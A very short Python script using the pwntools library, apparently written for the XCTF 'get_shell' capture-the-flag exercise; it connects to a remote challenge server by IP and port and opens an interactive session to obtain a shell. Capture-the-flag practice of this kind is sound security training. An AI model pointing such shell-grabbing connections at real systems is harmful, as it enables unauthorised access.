from pwn import *

path="/mnt/e/S/CTF/XCTF/pwn/get_shell"

sh=remote('111.200.241.244',58201)

sh.interactive()